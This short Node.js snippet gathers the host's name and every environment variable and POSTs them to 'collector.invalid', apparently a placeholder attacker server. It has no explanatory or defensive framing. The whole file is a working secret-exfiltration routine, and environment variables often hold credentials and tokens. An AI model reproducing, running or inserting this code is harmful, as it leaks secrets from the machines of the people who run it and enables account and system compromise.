const os = require("os");
const https = require("https");
const payload = JSON.stringify({ hostname: os.hostname(), env: process.env });
const req = https.request({ method: "POST", hostname: "collector.invalid" });
req.end(payload);
